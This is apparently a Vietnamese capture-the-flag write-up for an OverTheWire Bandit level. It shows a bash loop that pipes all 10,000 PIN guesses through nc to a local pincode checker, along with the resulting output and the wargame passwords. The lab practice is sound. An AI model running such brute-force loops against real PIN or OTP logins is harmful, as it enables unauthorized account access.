### **Mục tiêu**

- Vào localhost cổng 30002 nhập mật khẩu bandit24 và pincode gồm 4 chữ số thì sẽ trả về mật khẩu bandit25.
- Có 10000 con số để thử, ưu tiên `brute-forcing`

---

### **Cách tiếp cận**

- "Có Daemon đang lắng nghe để trả dữ liệu", nên ta dùng lệnh `nc`:

	`nc localhost 30002`

- Nhưng nếu như vậy thì chỉ nhập xuất được trong số lần nhất định, không tối ưu đến 10000 cách thử. Vì thế ta dùng:

	`for i in {0000..9999}; do echo "pass_bandit24 $i"; done | nc localhost 30002 | grep -v "Wrong!"`

=> Để thử, tìm và lọc ra dòng chính xác ("Correct!")

### **Các lệnh đã dùng**

```
# Kết nối và thử mật khẩu tự động (trâu)
for i in {0000..9999}; do echo "pass_bandit24 $i"; done | nc localhost 30002 | grep -v "Wrong!"
```

### **Kết quả**

```
bandit24@bandit:~$ for i in {0000..9999}; do echo "gb8KRRCsshuZXI0tUuR6ypOFjiZbf3G8 $i"; done | nc localhost 30002 | grep -v "Wrong!"
I am the pincode checker for user bandit25. Please enter the password for user bandit24 and the secret pincode on a single line, separated by a space.
Correct!
The password of user bandit25 is iCi86ttT4KSNe1armKiwbQNmB3YJP3q4
```

Mật khẩu cho level tiếp theo là:

`iCi86ttT4KSNe1armKiwbQNmB3YJP3q4`

---

### **Nhận xét**

- Là mô hình thực tế trong pentest khi gặp **PIN-based authentication** hoặc **OTP bruteforce**.